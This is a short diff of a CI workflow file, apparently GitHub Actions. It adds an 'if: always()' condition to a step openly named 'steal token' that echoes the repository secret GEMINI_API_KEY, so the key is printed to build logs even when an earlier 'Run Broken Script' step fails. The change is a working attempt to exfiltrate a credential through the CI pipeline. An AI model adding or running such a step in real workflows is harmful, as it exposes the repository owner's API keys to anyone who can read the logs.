@@ -20,6 +20,7 @@ jobs:
       - name: Run Broken Script
         run: python ci_exp/test_file.py
       - name: steal token
+        if: always()
         run: echo ${{ secrets.GEMINI_API_KEY }}
 
 # </code_context>
